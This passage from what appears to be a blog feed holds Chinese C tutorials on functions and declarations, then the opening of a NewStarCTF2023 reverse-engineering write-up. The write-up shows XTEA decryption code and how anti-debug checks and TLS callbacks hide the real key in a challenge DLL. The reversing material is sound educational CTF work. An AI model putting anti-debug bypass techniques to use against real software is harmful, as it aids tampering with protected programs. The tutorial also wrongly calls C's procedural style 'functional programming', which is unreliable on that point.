class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231104143147714.png" alt="image-20231104143147714" style="zoom:50%;" /><p>显然,main()函数中的x并没有发生变化,这意味着,使用x调用f(),仅仅是将main()函数中的变量x的值,也就是10,传递给f()函数,并将这个值&quot;赋值给&quot;f()中的形参x.</p><p>在f()中对形参x的任何操作都不会影响到main()中的x.</p><p>换言之,这两个x除了调用时进行了值的复制外,再没有任何关系!</p><h3 id="return语句和返回值">return语句和返回值</h3><p>return语句用于结束一个函数,并且它还负责返回一个计算好的返回值.</p><p>在f()中:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>return y;</code>代表着两件事:</p><ol><li><p>这个函数结束运行!</p><p>无论return后面还有没有其他语句,都要立即结束这个函数!这也意味着return并不是必须为最后一条语句.</p></li><li><p>将y作为返回值返回给主调函数!</p><p>这里的y可以替换为任意表达式,但是必须和<code>函数类型(函数的返回值类型)</code>相同或者可以转化为返回值类型!</p><p>例如我们可以直接这样写:</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> x*x; <span class="comment">// x*x是一个表达式,两个int相乘,结果仍为int,和返回值类型相匹配</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>此外,返回值类型和参数类型完全不必要完全相同,完全任意.<code>f()</code>仅仅是作为一个例子而已.</p><h2 id="函数声明-函数原型与函数定义">函数声明,函数原型与函数定义</h2><p>先放结论:</p><p>有关这些概念性问题,容易混淆,本人这里更倾向于这一种观点:</p><p><code>函数原型</code>,<code>函数定义</code>,都属于<code>函数声明</code>的一种,现代的C语言都统一使用<code>函数原型式的风格</code>对其进行统一.</p><p>我们在使用一个函数之前,即进行函数调用之前,都必须知道这个函数的相关信息,包括<code>函数名,函数参数个数,函数参数类型,函数返回值类型</code>,这些信息显然,在我们实现一个函数f()时,都已经给出:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 显然这是一个完整的函数声明(包括了函数体)</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>并且这一部分都放在了main()函数之前.我们尝试改变一下f()的位置:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>,x2;</span><br><span class="line">    x2 = f(x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;answer = %d\n&quot;</span>,x2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段代码会产生一个警告(注意并不是错误),原因是没有找到f()这个函数的声明.换言之,编译器此时在第5行的位置之前,并未找到有关f()的任何信息,它并不认识这个函数,更谈何调用.</p><p>解决方法很简单,在调用之前加上一个<code>声明</code>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="comment">// int f(int x); // 或者放在这里也可以的,并且&#x27;函数类型声明&#x27;可以重复</span></span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>,x2;</span><br><span class="line">    x2 = f(x);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;answer = %d\n&quot;</span>,x2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以我们知道,<code>对于一个函数调用,编译器必须知道这个函数的相关信息,才能正确地进行调用</code>.</p><br><p>而提供这些信息的操作就叫做<code>函数声明</code>,现代的C语言中,函数声明有两种方式,分别是<code>函数类型声明</code>和<code>函数定义</code>,需要知道的是,它们都采用<code>函数原型式的风格</code>.具体解释如下:</p><ol><li><p align=right>---WAHAHA</p><p>作为初学,我们无需去了解更加详细的细节,因为这涉及到C语言的发展.</p><p>我们只需要知道,函数原型提供了除了函数体以外的所有信息,也就是<code>int f(int x);</code>所提供给我们的所有信息,包括<code>函数名,函数参数个数,函数参数类型,函数返回值类型</code>.</p><p>编译器根据函数原型,就能够唯一确定一个函数,并且正确地调用这个函数.</p></li><li><p>函数类型声明</p><p>之所以不说函数声明,是因为声明是一个更加笼统的概念,<code>函数类型声明</code>属于其中的一种.</p><p>现在的函数类型声明和函数原型一模一样,就是<code>int f(int x);</code>,即仅仅给出函数头,并在结尾加上<code>;</code></p><p>有了这个信息,就相当于给出了函数原型,编译器就能找到正确的函数.</p></li><li><p>函数定义</p><p>函数定义,可以理解为最为全面的<code>函数声明</code>,他不仅提供了<code>函数的原型</code>,还给出了具体的<code>函数体</code>.</p><p>所谓函数定义,就是这一部分:</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数定义比函数类型声明更进一步,完全给出了一个函数,但是问题也很明显,只能使用一次,因为不能重复地给出一个函数体.</p></li></ol><br><p>总结:</p><p>C语言有着很长的发展历史,这里给出的内容,已经是现代C语言的规范了,无论是<code>函数类型声明</code>,还是<code>函数定义</code>,都给出了一个函数最基本的各种信息,也就是都采用<code>函数原型式的风格</code>.</p><p>C99把旧的非原型形式视为过时,因为他们是在C语言还未建立起如此规范的标准之前的写法.</p><p>我们在使用一个函数之前,一定要确保在调用点前有函数的声明存在,无论是仅仅给出声明(函数类型声明)还是给出完整的定义.</p><p>注:以上借鉴自https://www.cnblogs.com/pmer/archive/2011/09/04/2166579.html</p><h2 id="数学函数-参数和返回值的有无问题">数学函数?参数和返回值的有无问题</h2><p>同数学函数不同,数学函数一定有参数(自变量)和函数值(因变量),而C函数更多的是为了实现一个<code>过程</code>,而不是一定要计算出一个结果,甚至,这个过程不需要提供任何的参数作为前提.</p><p>例如,<code>stdlib.h</code>有一个函数<code>int rand();</code>这个函数不需要任何参数,所以参数列表是空的,其功能为生成一个伪随机数,当然不需要任何参数,最终将这个伪随机数作为函数返回值返回.</p><p>再例如,<code>stdlib.h</code>有一个函数<code>void free( void *ptr );</code>这个函数接受一个指针(这里的void *并不是没有参数的意思),用于释放其指向的内存空间,这个函数不需要返回任何值,仅仅释放空间后就直接结束.</p><br><p>如果一个函数不需要参数,或者不需要返回值,则可以使用<code>void</code>类型来说明.</p><p>另外,一个函数可以既没有返回值也不需要参数,则同样可以这样:<code>void func(void);</code></p><br><p><strong>必须注意的是</strong>,参数列表为空,可以写<code>void func(void)</code>,也可以写<code>void func()</code>,往往没有什么影响,但是二者并不是没有区别:</p><p>括号里加void,表明这个函数严格意义地没有参数;</p><p>而如果没有加void,表示这个函数可以有任意多个参数—尽管这些参数不会被处理.</p><br><p>例如,下面的程序用C编译器编译不会报错,能够正常运行(但是使用c++编译器报错!):</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">foo</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;run foo function successfully!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    foo(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="c和面向过程">C和面向过程</h1><h2 id="什么是面向过程">什么是面向过程</h2><p>面向过程是一种编程思想,其核心是<code>怎么做</code>,专注于完成任务的具体细节.</p><p>一般的面向过程是从上往下步步求精,所以,面向过程的核心是<code>模块化的思想</code>,清楚了程序的流程,就能够实现整个程序.</p><h3 id="c和面向过程">C和面向过程</h3><p>面向过程是一种编程模式,其核心为<code>模块化思想</code>,对于每一个模块的划分,不同的编程语言有着不同的实现.</p><p>对于C语言而言,使用<code>函数</code>来实现模块的分离.将每一个子过程放到一个个的函数中,运行时依次按顺序进行调用即可.亦即一个函数就是一个最小的模块.这也就是所谓的<code>函数式编程</code>.</p><p>不仅如此,我们可以将若干函数封装到同一个源文件中,这些功能相关的函数共同组成一个模块,用于实现一类操作.</p><p>关于面向过程的内容,还有很多,而且还有面向对象,面向切面等等的各种设计模式,碍于能力所限和主题限制,不在此讨论.</p><br><p>本部分分析了函数的各种使用细节,接下来将讲解进一步的使用方法.</p><p align=right>---WAHAHA</p><br><br><p>上一篇:<a href="../202382eafac4349b">C语言教程-12_1-初识函数</a></p><p>下一篇:<a href="../202339a6f8c668c3">C语言教程-12_3-函数的其他用法和特性</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C语言教程-12_1-初识函数</title>
      <link href="/202382eafac4349b/"/>
      <url>/202382eafac4349b/</url>
      
        <content type="html"><![CDATA[<p>提要:</p><ol><li>初步讲解C语言的<code>函数</code>的概念和语法</li></ol><p>前置知识:</p><ol><li>学习过数学,知道什么是数学的函数</li><li>掌握C语言<code>复合语句</code>的概念</li></ol><h1 id="什么是函数">什么是函数</h1><h2 id="数学意义上的函数">数学意义上的函数</h2><p><code>近代定义:</code>给定一个数集<code>A</code>，假设其中的元素为<code>x</code>，对<code>A</code>中的元素x施加对应法则<code>f</code>，记作<code>f(x)</code>，得到另一数集<code>B</code>，假设<code>B</code>中的元素为<code>y</code>，则<code>y</code>与<code>x</code>之间的等量关系可以用<code>y=f(x)</code>表示，函数概念含有三个要素：定义域<code>A</code>、值域<code>B</code>和对应法则<code>f</code>.</p><p>对于各位而言,一定知道函数的概念,简单的讲,就是根据一个特定的值<code>x</code>,对其进行特定的计算过程<code>f</code>,计算出最终的一个结果<code>y</code>,也就是<code>f(x)</code>.</p><p>注:为了方便后续内容的讲解,此后<code>函数值</code>均使用<code>f(x)</code>而不是<code>y</code>表示!</p><p>例如,我们求一个整数的平方,这个运算可以<code>封装</code>成一个函数<code>f(x)=x^2</code>来进行计算,我们传入任意的整数x,最终的结果f(x)仍然是一个整数,其值为x的平方.</p><h2 id="c语言中的函数">C语言中的函数</h2><h3 id="为什么需要函数">为什么需要函数</h3><p>随着程序复杂度的提高,我们不能够将所有的功能/运算过程都堆在一个main函数中,适当地拆分出来,编写为若干子函数,让他们互相配合,共同完成一个庞大的目标.</p><p>也就是所谓的&quot;大化小&quot;,每个函数都负责一个&quot;小目标&quot;,最终将所有函数做的&quot;贡献&quot;合并起来,完成整个程序.</p><p>或者,将一个庞大的操作分成若干的几步小操作,<code>依次</code>进行运算,可以使程序更加清晰!</p><p>这里涉及到<code>面向过程</code>编程思想,后续会讲解到.</p><h3 id="一个c函数的结构">一个C函数的结构</h3><p>C语言的函数(也包括其他所有支持<code>函数</code>的各种高级语言)这一命名是从数学引申来的,其一般意义和数学函数几乎完全等价,关键都是进行<code>某一种运算</code>.</p><p>前面的<code>f(x)=x^2</code>这一函数,使用C语言进行描述,一种写法为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="type">int</span> y = x * x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很容易理解,这个函数的名称为f,其接受一个整数x,在函数中计算x*x的值,赋值给一个整型变量y,最后把y的值返回.我们想要使用这个函数也很简单:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x=<span class="number">10</span>,x2;</span><br><span class="line">x2 = f(x); <span class="comment">// x2 的值为100</span></span><br></pre></td></tr></table></figure><p>我们根据这个例子来对应二者的等价关系:</p><table><thead><tr><th>一个函数的各个部分</th><th>数学函数</th><th>C语言的函数</th></tr></thead><tbody><tr><td>f</td><td>函数名</td><td>函数名</td></tr><tr><td>x</td><td>自变量</td><td>函数参数(形式参数)</td></tr><tr><td>f(x)</td><td>函数值</td><td>调用这个函数,return语句返回的值为函数值</td></tr><tr><td>x为整数</td><td>自变量的定义域(x为整数)</td><td>形参x的类型(为int)</td></tr><tr><td>返回的函数值为整数</td><td>因变量的值域(y/f(x)为整数)</td><td>int f(int x)中的第一个int,代表这个函数的返回值类型</td></tr><tr><td>执行的运算</td><td>对应法则f</td><td>函数体{}中的语句构成的代码块,依次执行</td></tr></tbody></table><p>我们可以很容易地看出两者之间的关系,我们将上面的代码完善一下,引入C语言函数的语法↓</p><p>为了直观,概念讲解直接在注释中给出:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 为了调用printf()这个函数需要引入stdio.h头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下面的10~19行是一个完整的函数f</span></span><br><span class="line"><span class="comment">// 第一个int为函数的返回值,它指定了函数中return语句最终返回的值的类型</span></span><br><span class="line"><span class="comment">// 返回值后面紧跟函数名,他必须是一个合法的C语言标识符</span></span><br><span class="line"><span class="comment">// 函数名后面的一个圆括号,里面有若干变量的声明,用逗号分隔,这些变量叫做函数形参(形式参数),亦即</span></span><br><span class="line"><span class="comment">// 数学函数的自变量</span></span><br><span class="line"><span class="comment">// 形参声明同样需要给定类型,(int x)代表这个函数需要一个整型的参数,命名为x</span></span><br><span class="line"><span class="comment">// 形参列表-也就是(int x),之后紧跟一个花括号&#123;&#125;,内有若干语句(实际上是一个复合语句),代表函数的实际运算</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">f</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">    <span class="comment">// 和数学函数不同,数学上仅仅是一个对应关系f,指定了计算;</span></span><br><span class="line">    <span class="comment">// 而C函数中可以声明中间变量来辅助计算,这里的y就是一个中间变量,实际上,它用来存储最终计算的结果</span></span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 这里是最关键的对应关系f的体现,计算x的平方,将结果赋值给y进行临时保存</span></span><br><span class="line">    y = x*x;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// return语句,顾名思义,用于&#x27;返回&#x27;一个值,这个值的类型必须和前面的函数返回值类型相同(或可以进行转换)</span></span><br><span class="line">    <span class="comment">// 将y的值返回,也就是作为这个函数f的函数值返回,一旦执行了return语句,其所在的函数(也就是f())立即结束运行</span></span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 显然,main()也是一个函数!只不过它十分特殊,后面进行讲解</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> x = <span class="number">10</span>,x2; <span class="comment">// 同样,可以视为中间变量</span></span><br><span class="line">    x2 = f(x); <span class="comment">// 这条语句调用了f()函数,将main中的x作为参数(实际参数)传递给f()</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;answer = %d\n&quot;</span>,x2); <span class="comment">// 这条语句调用了printf()函数,将一个格式化字符串和x2最为参数(实际参数)传递给printf()</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 同样,立即结束main()函数的运行,0作为返回值.</span></span><br><span class="line">    <span class="comment">// 只不过,main函数特殊,其一旦结束,代表着整个程序结束!</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释已经写的十分完善,读者在一步步阅读,也在一步步分析上面代码的写法.但是还有两个概念:</p><ol><li><p>函数头</p><p><code>int f(int x)</code>这一部分实际上是一个<code>函数签名</code>,它告诉了我们(更重要的是告诉编译器)这个函数接受<code>1</code>个<code>int类型</code>的参数,并最终<code>返回</code>一个(任何函数都仅且仅能返回一个值)<code>int类型</code>的返回值作为函数调用的结果.</p></li><li><p>函数体</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> y;</span><br><span class="line">    y = x*x;</span><br><span class="line">    <span class="keyword">return</span> y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>紧跟着函数头的是一个<code>复合语句</code>,在这里称之为<code>函数体</code>,它相当于指定了这个函数的真正运算,其内的各条子语句依次按照逻辑执行,最终(可能)返回一个值.</p></li></ol><h3 id="进一步分析结构">进一步分析结构</h3><p>我们可以看到,一个完整的<code>函数定义</code>(注意不是函数声明!!!)包括两部分:函数头和函数体.</p><p>并且函数头指定了这个函数的相关信息(函数参数的个数及其类型,函数的返回值类型),而且隐含的一点是,它唯一确定了这个函数!</p><p>函数体一旦给出,代表给出了这个函数的定义,这样这个函数就真正意义上的彻底给出!</p><p>函数头中的圆括号(),其中的各个声明,称为形式参数,各个参数使用<code>逗号,</code>隔开,并且严格规定顺序,例如:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">double</span> <span class="title function_">function</span><span class="params">(<span class="type">int</span> a,<span class="type">char</span> b)</span>;</span><br></pre></td></tr></table></figure><p>这个函数接受两个参数,第一个参数为int类型,第二个为char类型,返回一个double类型的值.</p><h2 id="注意事项">注意事项</h2><ol><li><p>然而,C语言的函数并不完全等同于数学函数,因为C语言的函数不一定需要参数,甚至,它可能都不需要返回一个值!</p><p>我们后面很快就能看到相关例子!—其实我们已经见到了,那就是main函数!它往往不需要参数!</p></li><li><p>一个函数一旦给出函数体,意味着这个函数实现了定义,在整个程序的任何其他位置,都不能够给出这个函数的第二个定义,即使两个定义一模一样也不行!</p></li><li><p>我们很快就会学习到,有无给出函数体的区别及意义,这涉及到<code>声明</code>和<code>定义</code>的区别.</p><p>并且,C语言中,同一个函数(一个函数名)只能有&quot;一种&quot;函数头—或者准确点:<code>函数签名</code>.</p></li></ol><br><p>本部分讲解了C函数的基本框架语法,接下来会分部分详细讲解函数这一重要组成部分!</p><p align=right>---WAHAHA</p><br><br><p>上一篇:<a href="../2023b45ef26d6ec3">C语言教程-11-字符串</a></p><p>下一篇:<a href="../2023def693eb5bf8">C语言教程-12_2-深入分析函数和面向过程初识</a></p>]]></content>
      
      
      <categories>
          
          <category> C语言教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Writeup-NewStarCTF2023</title>
      <link href="/2023dbb77dc4c313/"/>
      <url>/2023dbb77dc4c313/</url>
      
        <content type="html"><![CDATA[<p>逆向大部分题都很简单,AK了week1,没什么好记录的,week2和week3有几道题需要记录一下.</p><p>week3和week4没怎么打,看着慢慢补充吧…</p><h1 id="reverse">Reverse</h1><h2 id="ezdll">EzDll</h2><p>先看exe文件,可以看到使用<code>encrypt()</code>函数对flag进行加密,并且从<code>[4*i]</code>猜测是TEA系加密:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025182319801.png" alt="image-20231025182319801"></p><p>DLL动态链接库同样可以使用IDA进行分析,在题目提供的dll文件中我们可以找到<code>encrypt()</code>加密函数:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025182118379.png" alt="image-20231025182118379"></p><p>可以看到这是一个魔改的XTEA加密,所以传递的第二个参数就是密钥,我们将其提取出来,然后尝试进行解密:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">XTEA_decryot</span><span class="params">(<span class="type">uint32_t</span> *v, <span class="type">uint32_t</span> *key)</span> &#123;</span><br><span class="line">    <span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line">    <span class="type">uint32_t</span> delta = <span class="number">999999999</span>;</span><br><span class="line">    <span class="type">uint32_t</span> sum = <span class="number">1</span> + delta * <span class="number">33</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">33</span>; i++) &#123;</span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">3</span>) ^ (v0 &gt;&gt; <span class="number">4</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">3</span>) ^ (v1 &gt;&gt; <span class="number">4</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v[<span class="number">0</span>] = v0;</span><br><span class="line">    v[<span class="number">1</span>] = v1;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> v4[] = &#123;</span><br><span class="line">            <span class="number">130</span>, <span class="number">67</span>, <span class="number">163</span>, <span class="number">137</span>, <span class="number">111</span>, <span class="number">186</span>, <span class="number">128</span>, <span class="number">200</span>, <span class="number">248</span>, <span class="number">180</span>,</span><br><span class="line">            <span class="number">86</span>, <span class="number">189</span>, <span class="number">179</span>, <span class="number">65</span>, <span class="number">178</span>, <span class="number">141</span>, <span class="number">218</span>, <span class="number">68</span>, <span class="number">14</span>, <span class="number">4</span>,</span><br><span class="line">            <span class="number">3</span>, <span class="number">46</span>, <span class="number">56</span>, <span class="number">222</span>, <span class="number">18</span>, <span class="number">84</span>, <span class="number">173</span>, <span class="number">137</span>, <span class="number">149</span>, <span class="number">48</span>,</span><br><span class="line">            <span class="number">99</span>, <span class="number">33</span>, <span class="number">223</span>, <span class="number">13</span>, <span class="number">148</span>, <span class="number">17</span>, <span class="number">220</span>, <span class="number">178</span>, <span class="number">208</span>, <span class="number">17</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>,</span><br><span class="line">            <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">uint32_t</span> *v4p = (<span class="type">uint32_t</span> *) v4;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint32_t</span> key[] = &#123;</span><br><span class="line">            <span class="number">276</span>, <span class="number">1300</span>, <span class="number">6425</span>, <span class="number">2064</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">9</span>; ++i) &#123;</span><br><span class="line">        XTEA_decryot(&amp;v4p[<span class="number">2</span> * i], key);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s\n&quot;</span>, (<span class="type">char</span> *) v4);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现乱码,说明哪里有问题.</p><p>再看main函数和函数列表,发现有反调试的部分,例如这个异或判断,就要求必须是不在调试的时候运行,否则<code>IsDebuggerPresent()</code>会返回非0值:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025182555465.png" alt="image-20231025182555465"></p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025182617217.png" alt="image-20231025182617217" style="zoom:50%;" /><p>并且在函数列表发现了Tls相关的函数(别问我是怎么知道这东西的),并且我们知道其常常被用于反调试…</p><p>最终我们在一系列&quot;callback&quot;函数中找到了这个该死的对key进行修改的部分:</p><p><img src="https://typora-blogs-pic.oss-cn-beijing.aliyuncs.com/img/image-20231025184514929.png" alt="image-20231025184514929"></p><p>这里的数组就是key数组.</p><p>把这里的修改加上就出flag了:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 